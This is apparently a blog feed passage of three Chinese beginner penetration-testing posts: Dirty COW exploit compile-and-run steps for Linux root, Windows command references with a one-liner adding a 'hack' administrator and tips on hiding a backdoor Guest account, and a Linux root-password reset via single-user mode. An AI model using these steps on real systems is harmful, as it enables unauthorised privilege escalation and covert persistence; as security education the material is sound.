      <url>/posts/6b89328c.html</url>
      
        <content type="html"><![CDATA[<h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>Linux kernel &gt;= 2.6.22（2007年发行，到2016年10月18日前所有发行版本）</p><h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><p>普通权限用户执行编译后的exp直接提权成root用户</p><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>get_user_page内核函数在处理Copy-on-Write(以下使用COW表示)的过程中，产出竞态条件造成COW过程被破坏，导致出现写数据到进程地址空间内只读内存区域的机会。修改su或者passwd程序就可以达到root的目的。具体分析可查看<a href="https://www.anquanke.com/post/id/84851" target="_blank" rel="noopener">安全客</a>。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><ul><li><a href="https://github.com/FireFart/dirtycow" target="_blank" rel="noopener">下载EXP</a></li><li>编译EXP</li></ul><pre class="line-numbers language-bash"><code class="language-bash">gcc -pthread dirty.c -o exp -lcrypt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>执行exp</li></ul><pre class="line-numbers language-bash"><code class="language-bash">./ exp 密码<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>效果<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200222000330974.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 渗透测试篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> 提权 </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试之Windows基础（新手必看）</title>
      <link href="/posts/e33a36a5.html"/>
      <url>/posts/e33a36a5.html</url>
      
        <content type="html"><![CDATA[<h3 id="文件目录相关"><a href="#文件目录相关" class="headerlink" title="文件目录相关"></a>文件目录相关</h3><h5 id="查看隐藏目录"><a href="#查看隐藏目录" class="headerlink" title="查看隐藏目录"></a>查看隐藏目录</h5><p>打开我的电脑，点击查看，勾选隐藏的项目即可：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200412144054876.png" alt="在这里插入图片描述"></p><h5 id="设置隐藏目录"><a href="#设置隐藏目录" class="headerlink" title="设置隐藏目录"></a>设置隐藏目录</h5><p>选中文件夹，右键，属性，勾选隐藏，应用即可：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200412145117944.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>访问的话我们可以直接从盘符地址栏哪里访问：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200412145145191.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h5 id="一些重要的文件-文件夹"><a href="#一些重要的文件-文件夹" class="headerlink" title="一些重要的文件/文件夹"></a>一些重要的文件/文件夹</h5><ul><li>C:\ProgramData：一些临时的配置文件，病毒一般会先锁这个文件夹。</li><li>C:\Windows\System32：存放系统配置文件、应用程序。</li><li>C:\Windows\System32\config：这个目录下有一个SAM文件，他存储的是我们系统的用户名跟账号，不过是打不开的，密码也是经过哈希加密的，一般通过lc5、彩虹表、PE来破解账号密码。</li><li>hosts文件：DNS解析文件，优先级高于DNS。</li><li>用户：C盘下的用户目录，里面的桌面文件夹。</li><li>我的文档：里面的Tencent Files存储的是QQ上下载的文件。</li></ul><h3 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h3><p>Win+R输入services.msc看一下有哪些服务，不懂的看一下描述即可：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200412155034788.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h3><p>这是一些常见的端口，遇到不熟悉的端口号也可以自己去百度一下对应的服务与漏洞。</p><pre><code>21 FTP（文件传输协议）。 FTP 用于在您的计算机和其他计算机之间进行文件传输。 仅当您在运行 FTP 服务器时，才应打开21端口！22 SSH。 到该端口的 TCP 连接可能表示对 SSH 的搜索，SSH 有几个可利用的功能。 SSH 可安全替代 Telnet。 SSH 最常用于从服务器安全登录和复制文件。23 Telnet。 Telnet 可用于从世界任何一个地方的终端登录您的计算机。 仅当您在运行 Telnet 服务器时，才应打开该端口。25 SMTP（简单邮件传输协议）。 用于主机到主机的邮件传输的协议。 仅当您在运行邮件服务器时，才应打开该端口。79 Finger。 Finger 是一种 Internet 实用程序，它允许某些人获得有关您的信息，包括您的全名、登录状态和其他配置信息。80 HTTP（超文本传输协议）。 HTTP 用于通过 Internet 传输网页。 仅当您在运行 Web 服务器时，才应打开该端口。110 POP3（邮局协议）。 Internet 邮件服务器和邮件过滤器应用程序使用该端口。 仅当您在运行邮件服务器时，才应打开该端口。113 身份/验证。某些邮件、新闻或中继聊天服务器需要该服务以允许访问。 隐藏该端口会造成性能问题。119 NNTP（网络新闻传输协议）。新闻服务器向新闻阅读器应用程序及在其他服务器之间分发 Usenet 文章所用的服务。135 位置服务 (loc-srv)。该端口用于对适当的动态映射端口的直接 RPC (Remote Procedure Calls) 服务。 黑客可以使用它确定有哪些端口被若干 Windows 服务使用。 该端口不应当从 Internet 可见。139 NetBIOS。 NetBIOS 用于 Windows 文件和打印共享。 如果端口 139 打开，则您的计算机可通过 Internet 共享文件。 NetBIOS 的其他组件可以暴露您的计算机名、工作组、用户名及其他信息。143 IMAP（Internet 消息访问协议）。 IMAP 是用于发送电子邮件的高级协议。 仅当您在运行 IMAP 服务器时，才应打开该端口。443 HTTP over TLS/SSL。提供安全 HTTP 通信的协议。 仅当您在运行 Web 服务器时，才应打开该端口。445 Windows NT / 2000 SMB。用于交换服务器消息块的标准，可以多种方式利用，包括获得您的密码。1080 SOCKS。 该协议允许计算机通过防火墙访问 Internet。 当几台计算机共用一个 IP 地址时使用它。 该协议通常只允许向外访问 Internet。 但它经常配置不当，允许黑客通过防火墙向内传递通信。1723 PPTP（点到点隧道协议）。该服务用于虚拟专用网连接。5000 UPnP (通用即插即用)。该服务用于与连接网络的所有 UPnP 设备通信。5631 pcAnywhere。被控端模式的 Symantec pcAnywhere 使用该端口</code></pre><p>那么我们一般通过端口来干什么呢：</p><ul><li>信息收集</li><li>目标探测</li><li>服务判断</li><li>系统判断</li><li>系统角色分析</li></ul><h3 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h3><p>Win+R输入regedit即可打开注册表：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200413110427271.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里我们可以看一下注册表里开机自动运行了程序：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200413113231483.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这是5个根键，分管五个方向，注册表就是Windows系统的数据库，你如果系统中马了可以从三个地方去查找，一个是注册表，另一个就是msconfig。</p><h5 id="msconfig"><a href="#msconfig" class="headerlink" title="msconfig"></a>msconfig</h5><p>win+r打开msconfig——&gt;服务，一般制造商是未知的可能就是木马，我觉得Win10这个优化的不行，在Win7里这些服务在那个目录下都是显示的，Win10把这块优化掉了：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200413112718297.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h5 id="cmd"><a href="#cmd" class="headerlink" title="cmd"></a>cmd</h5><p>第三种方法就是在cmd里输入netstat -o，如果怀疑自己中马了，被别人远控了，每次开机先打开cmd输一下这个命令，看看是不是连接到了别人服务器的端口（这个端口肯定是固定的），有可能还可以顺着网线杀回去哈哈。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200413114112829.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="常用Dos命令"><a href="#常用Dos命令" class="headerlink" title="常用Dos命令"></a>常用Dos命令</h3><p>这个太多了，网上也有很详细了，多去练练吧！</p><pre><code>net use ipipc$ " " /user:" " 建立IPC空链接 net use ipipc$ "密码" /user:"用户名" 建立IPC非空链接 net use h: ipc$ "密码" /user:"用户名" 直接登陆后映射对方C：到本地为H: net use h: ipc$ 登陆后映射对方C：到本地为H: net use ipipc$ /del 删除IPC链接 net use h: /del 删除映射对方到本地的为H:的映射 net user 用户名　密码　/add 建立用户 net user guest /active:yes 激活guest用户 net user 查看有哪些用户 net user 帐户名 查看帐户的属性 net locaLGroup administrators 用户名 /add 把“用户”添加到管理员中使其具有管理员权限,注意：administrator后加s用复数 net start 查看开启了哪些服务 net start 服务名　 开启服务；(如:net start telnet， net start schedule) net stop 服务名 停止某服务 net time 目标ip 查看对方时间 net time 目标ip /set 设置本地计算机时间与“目标IP”主机的时间同步,加上参数/yes可取消确认信息 net view 查看本地局域网内开启了哪些共享 net view ip 查看对方局域网内开启了哪些共享 net config 显示系统网络设置 net logoff 断开连接的共享 net pause 服务名 暂停某服务 net send ip "文本信息" 向对方发信息 net ver 局域网内正在使用的网络连接类型和信息 net share 查看本地开启的共享 net share ipc$ 开启ipc$共享 net share ipc$ /del 删除ipc$共享 net share c$ /del 删除C：共享 net user guest 12345 用guest用户登陆后用将密码改为12345 net password 密码 更改系统登陆密码 netstat -a 查看开启了哪些端口,常用netstat -an netstat -n 查看端口的网络连接情况，常用netstat -an netstat -v 查看正在进行的工作 netstat -p 协议名 例：netstat -p tcq/ip 查看某协议使用情况（查看tcp/ip协议使用情况） netstat -s 查看正在使用的所有协议使用情况 nBTstat -A ip 对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名（03前的为用户名）-注意：参数-A要大写 trAcert -参数 ip(或计算机名) 跟踪路由（数据包），参数：“-w数字”用于设置超时间隔。 ping ip(或域名) 向对方主机发送默认大小为32字节的数据，参数：“-l[空格]数据包大小”；“-n发送数据次数”；“-t”指一直ping。 ping -t -l 65550 ip 死亡之ping(发送大于64K的文件并一直ping就成了死亡之ping) ipconfig (winipcfg) 用于windows NT及XP(windows 95 98)查看本地ip地址，ipconfig可用参数“/all”显示全部配置信息 tlist -t 以树行列表显示进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内) kill -F 进程名 加-F参数后强制结束某进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内) del -F 文件名 加-F参数后就可删除只读文件,/AR、/AH、/AS、/AA分别表示删除只读、隐藏、系统、存档文件，/A-R、/A-H、/A-S、/A-A表示删除除只读、隐藏、系统、存档以外的文件。例如“DEL/AR *.*”表示删除当前目录下所有只读文件，“DEL/A-S *.*”表示删除当前目录下除系统文件以外的所有文件del /S /Q 目录 或用：rmdir /s /Q 目录 /S删除目录及目录下的所有子目录和文件。同时使用参数/Q 可取消删除操作时的系统确认就直接删除。（二个命令作用相同） move 盘符路径要移动的文件名　存放移动文件的路径移动后文件名 移动文件,用参数/y将取消确认移动目录存在相同文件的提示就直接覆盖 fc one.txt two.txt &gt; 3st.txt 对比二个文件并把不同之处输出到3st.txt文件中，"&gt; "和"&gt; &gt;" 是重定向命令 at id号 开启已注册的某个计划任务 at /delete 停止所有计划任务，用参数/yes则不需要确认就直接停止 at id号 /delete 停止某个已注册的计划任务 at 查看所有的计划任务 at ip time 程序名(或一个命令) /r 在某时间运行对方某程序并重新启动计算机 finger username @host 查看最近有哪些用户登陆 telnet ip 端口 远和登陆服务器,默认端口为23 open ip 连接到IP（属telnet登陆后的命令） telnet 在本机上直接键入telnet 将进入本机的telnet copy 路径文件名1　路径文件名2 /y 复制文件1到指定的目录为文件2，用参数/y就同时取消确认你要改写一份现存目录文件 copy c:srv.exe ipadmin$ 复制本地c:srv.exe到对方的admin下 cppy 1st.jpg/b+2st.txt/a 3st.jpg 将2st.txt的内容藏身到1st.jpg中生成3st.jpg新的文件，注：2st.txt文件头要空三排，参数：/b指二进制文件，/a指ASCLL格式文件 copy ipadmin$svv.exe c: 或:copyipadmin$*.* 复制对方admini$共享下的srv.exe文件（所有文件）至本地C： xcopy 要复制的文件或目录树　目标地址目录名 复制文件和目录树，用参数/Y将不提示覆盖相同文件 tftp -i 自己IP(用肉机作跳板时这用肉机IP) get server.exe c:server.exe 登陆后，将“IP”的server.exe下载到目标主机c:server.exe 参数：-i指以二进制模式传送，如传送exe文件时用，如不加-i 则以ASCII模式（传送文本文件模式）进行传送 tftp -i 对方IP　put c:server.exe 登陆后，上传本地c:server.exe至主机 ftp ip 端口 用于上传文件至服务器或进行文件操作，默认端口为21。bin指用二进制方式传送（可执行文件进）；默认为ASCII格式传送(文本文件时) route print 显示出IP路由，将主要显示网络地址Network addres，子网掩码Netmask，网关地址Gateway addres，接口地址Interface arp 查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址。arp -a将显示出全部信息 start 程序名或命令 /max 或/min 新开一个新窗口并最大化（最小化）运行某程序或命令 mem 查看cpu使用情况 attrib 文件名(目录名) 查看某文件（目录）的属性 attrib 文件名 -A -R -S -H 或 +A +R +S +H 去掉(添加)某文件的 存档，只读，系统，隐藏 属性；用＋则是添加为某属性 dir 查看文件，参数：/Q显示文件及目录属系统哪个用户，/T:C显示文件创建时间，/T:A显示文件上次被访问时间，/T:W上次被修改时间 date /t 、 time /t 使用此参数即“DATE/T”、“TIME/T”将只显示当前日期和时间，而不必输入新日期和时间 set 指定环境变量名称=要指派给变量的字符 设置环境变量 set 显示当前所有的环境变量 set p(或其它字符) 显示出当前以字符p(或其它字符)开头的所有环境变量 pause 暂停批处理程序，并显示出：请按任意键继续.... if 在批处理程序中执行条件处理（更多说明见if命令及变量） goto 标签 将cmd.exe导向到批处理程序中带标签的行（标签必须单独一行，且以冒号打头，例如：“：start”标签） call 路径批处理文件名 从批处理程序中调用另一个批处理程序 （更多说明见call /?） for 对一组文件中的每一个文件执行某个特定命令（更多说明见for命令及变量） echo on或off 打开或关闭echo，仅用echo不加参数则显示当前echo设置 echo 信息 在屏幕上显示出信息 echo 信息 &gt;&gt; pass.txt 将"信息"保存到pass.txt文件中 findstr "Hello" aa.txt 在aa.txt文件中寻找字符串hello find 文件名 查找某文件 title 标题名字 更改CMD窗口标题名字 color 颜色值 设置cmd控制台前景和背景颜色；0＝黑、1＝蓝、2＝绿、3＝浅绿、4＝红、5＝紫、6＝黄、7=白、8=灰、9=淡蓝、A＝淡绿、B=淡浅绿、C=淡红、D=淡紫、E=淡黄、F=亮白 prompt 名称 更改cmd.exe的显示的命令提示符(把C:、D:统一改为：EntSky )ver 在DOS窗口下显示版本信息 winver 弹出一个窗口显示版本信息（内存大小、系统版本、补丁版本、计算机名） format 盘符 /FS:类型 格式化磁盘,类型:FAT、FAT32、NTFS ,例：Format D: /FS:NTFS md　目录名 创建目录 replace 源文件　要替换文件的目录 替换文件 ren 原文件名　新文件名 重命名文件名 tree 以树形结构显示出目录，用参数-f 将列出第个文件夹中文件名称 type 文件名 显示文本文件的内容 more 文件名 逐屏显示输出文件 doskey 要锁定的命令＝字符doskey 要解锁命令= 为DOS提供的锁定命令(编辑命令行，重新调用win2k命令，并创建宏)。如：锁定dir命令：doskey dir=entsky (不能用doskey dir=dir)；解锁：doskey dir= taskmgr 调出任务管理器 chkdsk /F D: 检查磁盘D并显示状态报告；加参数/f并修复磁盘上的错误 tlntadmn telnt服务admn,键入tlntadmn选择3，再选择8,就可以更改telnet服务默认端口23为其它任何端口 exit 退出cmd.exe程序或目前，用参数/B则是退出当前批处理脚本而不是cmd.exe path 路径可执行文件的文件名 为可执行文件设置一个路径。 cmd 启动一个win2K命令解释窗口。参数：/eff、/en 关闭、开启命令扩展；更我详细说明见cmd /? regedit /s 注册表文件名 导入注册表；参数/S指安静模式导入，无任何提示； regedit /e 注册表文件名 导出注册表</code></pre><p>这里需要做一下创建用户这一块的笔记，后期提权的时候会用到。</p><p>创建一个hack用户并添加到管理组</p><pre class="line-numbers language-c"><code class="language-c">net user hack hack <span class="token operator">/</span>add <span class="token operator">&amp;&amp;</span> net localgroup administrators hack <span class="token operator">/</span>add<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200413141026812.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>一般在渗透服务器的时候我们并不能直接添加到administrators组，我们可以添加到<strong>Remote Desktop Users</strong>这个组，这个组是远程桌面登录用户组但即使是登录了也还是普通用户，这时候就看你拿的是什么权限了，如果是system那就可以给文件降权，降到everyone就可以了。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200413141551996.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>这也并不保险，因为会留下明显的痕迹，我们可以启用Guest用户，设个密码，把Guest添加到管理组即可，这样就不会有那么明显的变动了。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200413142113664.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="批处理"><a href="#批处理" class="headerlink" title="批处理"></a>批处理</h3><p>批处理就是把很多条命令添加到一个后缀为.bat的文件里，逐条执行，现在网上有很多什么一键开3389，一键留后门这种程序，就是传上大马的时候用的，直接在肉鸡的命令行里执行bat就行了：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200413143732746.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 渗透测试篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试之Linux基础（新手必看）</title>
      <link href="/posts/c05c8063.html"/>
      <url>/posts/c05c8063.html</url>
      
        <content type="html"><![CDATA[<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p>系统</p><pre><code>uname -a                     # 查看内核/操作系统/CPU信息head -n 1 /etc/issue         # 查看操作系统版本cat /proc/cpuinfo            # 查看CPU信息hostname                     # 查看计算机名env                         # 查看环境变量dmidecode                     #查看硬件详细信息</code></pre><p>资源</p><pre><code>free -m     # 查看内存使用量和交换区使用量df -h         # 查看各分区使用情况du -sh         # 查看指定目录的大小uptime         # 查看系统运行时间、用户数、负载</code></pre><p>网络</p><pre><code>ifconfig             # 查看所有网络接口的属性iptables -L         # 查看防火墙设置route -n             # 查看路由表netstat -lntp         # 查看所有监听端口netstat -antp         # 查看所有已经建立的连接netstat -s             # 查看网络统计信息lsof                #查看网络信息</code></pre><p>进程</p><pre><code>ps -ef         # 查看所有进程top         # 实时显示进程状态</code></pre><p>用户</p><pre><code>w                             # 查看活动用户id                             # 查看指定用户信息last                         # 查看用户登录日志finger root                 #查看管理信息cut -d: -f1 /etc/passwd     # 查看系统所有用户cut -d: -f1 /etc/group         # 查看系统所有组crontab -l                     # 查看当前用户的计划任务</code></pre><p>   服务</p><pre><code>chkconfig --list                 # 列出所有系统服务chkconfig --list | grep on         # 列出所有启动的系统服务</code></pre><p>   程序（<a href="https://www.linuxidc.com/Linux/2017-01/139140.htm" target="_blank" rel="noopener">配置yum源</a>）</p><pre><code>rpm -qa                 # 查看所有安装的软件包rpm -ivh                 # 安装rpm包rpm -e                    # 卸载rpm包yum -y install man        # 从yum源安装man命令，自动查找安装依赖关系（这个挺好用的）yum -y remove man        # 卸载man命令</code></pre><p>渗透常用</p><pre><code>uname -r                     # 查看系统内核版本号hostname                     # 查看主机名cat/proc/cpuinfo             # 查看CPU信息ifconfig                     # 查看当前接口IPhalt                         # 关机reboot                         # 重启pwd                         # 查看当前路径cp                             # 拷贝文件find [范围] [查找条件]          # 查找文件gzip -9 a.sql a.gz            # 把a.sql高度压缩成a.gzgzip -d a.gz                # 解压缩tar -cvf c.tar a b            # 把文件a与b打包成c.tartar -zxvf c.tar                # 解压c.tar到当前目录useradd                        # 添加用户userdel                        # 删除用户passwd 用户名                # 修改指定用户的密码</code></pre><p>常用的命令太多了，推荐大家去看一下《Linux就该这么学》，上面挺全的。</p><h3 id="vi的使用"><a href="#vi的使用" class="headerlink" title="vi的使用"></a>vi的使用</h3><p>常用命令</p><pre><code>:set nu        //显示行号a，A，o，O，i，I            //插入文本/passwd        //在文本中查找passwd（从光标向下），按n检索下一个?passwd        //在文本中查找passwd（从光标向上），按n检索下一个dd            //删除整行3dd            //一次性删除3行yy            //复制整行p            //粘贴整行:            //进入底行模式:%s/a/bg    //把a全部替换成bu            //撤销操作e!            //恢复到打开文本的最初状态:wq!        //强制（!）保存（w）退出（q）</code></pre><h3 id="登陆密码破解"><a href="#登陆密码破解" class="headerlink" title="登陆密码破解"></a>登陆密码破解</h3><p>这个其实就是进单用户模式，我这里的环境是RHEL7.0。</p><p>选择内核的时候按e<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200413160920172.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>进去之后，在这个linux16下一行的ro这里修改，改为rw init=/sysroot/bin/sh，然后按ctrl+x即可：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200413162124910.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后依次执行以下命令：</p><pre class="line-numbers language-c"><code class="language-c">chroot <span class="token operator">/</span>sysroot<span class="token operator">/</span>passwdtouch <span class="token operator">/</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200413162440446.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>执行完以后，连按ctrl+d直至出现loginout<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020041316493573.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>reboot重启即可，这时密码已经修改了，很容易崩，改的时候先拍快照吧</p><h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h3><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200413173204836.png" alt="在这里插入图片描述"></p><pre><code>/bin用来存放普通用户的可执行文件/boot用来存储系统装载引导程序/dev各种存储介质/etc这个比较重要，系统的配置文件、一些服务的配置文件等等/home普通用户的家目录，相当于Windows的用户目录/lib静态库，一些函数库/media主要用于挂载光驱/opt第三方程序的安装目录/proc随系统开机生成一些配置文件/root管理员的家目录/sbin用于存放管理员的命令/srv、/sys、/tmp存放程序的临时配置文件/usr用于储存第三方的外部程序的目录比如user/bin、user/local/var这个也很重要，用于存储系统库还有系统日志比如/var/log、/var/www/html</code></pre><h3 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h3><pre><code>ifconfig eth0 192.168.1.105/24        //临时修改网卡eth0的IP地址为192.168.1.105ifconfig eth0 up/down                //开启/关闭接口eth0service network restart             //重启网络服务ifconfig eno16777736:1 IP地址        //创建一个逻辑接口并配上IPvi /etc/sysconfig/network-scripts/ifcfg-eth0        //手动配置网络</code></pre><h3 id="权限设置"><a href="#权限设置" class="headerlink" title="权限设置"></a>权限设置</h3><p>这个为什么单独拿出来写呢，因为这个命令在加固的时候很有用，这就是chmod命令</p><p>首先我们得会看目录权限，就是ls -alh输出的内容：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200413222820759.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>就拿x.tar这个文件来说吧</p><pre class="line-numbers language-shell"><code class="language-shell">-rw-r--r--.  1 root  root   10K 4月  13 21:02 x.tar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>首先第一个-代表这是一个文件，不是一个目录，目录是以d开头的，文件夹前的日期就是最后一次修改日期，前面的10k就是文件大小，中间的1代表的是文件节点。其次，两个root，左边的是文件的所有者，右边的是文件所在的分组，也就是说这个文件是由root组下的root用户创建的。最后，前边的这串 rw-r--r-- 